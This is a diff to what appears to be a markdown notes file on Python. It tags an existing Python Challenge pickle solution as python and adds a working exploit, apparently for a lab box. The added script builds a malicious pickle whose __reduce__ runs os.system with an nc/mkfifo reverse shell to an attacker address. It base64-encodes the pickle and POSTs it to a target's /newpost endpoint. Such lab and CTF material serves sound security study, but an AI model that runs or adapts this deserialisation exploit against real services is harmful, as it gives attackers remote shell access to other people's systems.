@@ -22,7 +22,7 @@ It is possible to create a `.py` file named with the name of the import. This wi
 
 > - <https://www.hackingnote.com/en/python-challenge-solutions/level-5>
 
-```
+```python
 #!/usr/bin/python3
 import sys
 import pickle
@@ -41,4 +41,29 @@ for i in mydict:
         b.append(x[0] * x[1])
 
     print("".join(b))
+```
+
+
+```python
+import cPickle, requests, base64
+
+LHOST = '10.10.14.14'
+LPORT = '31337'
+RHOST = '10.10.10.91'
+RPORT = '5000'
+
+
+class Payload(object):
+	def __init__(self, cmd):
+		self.cmd = cmd
+	def __reduce__(self):
+		import os
+		return (os.system, (self.cmd,))
+
+
+reverse_sh = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f" % (LHOST, LPORT)
+evilpickle = cPickle.dumps(Payload(reverse_sh))
+
+r = requests.post('http://%s:%s/newpost' % (RHOST, RPORT), data=base64.urlsafe_b64encode(evilpickle))
+print('POST {} {}'.format(r.status_code, r.url))
 ```
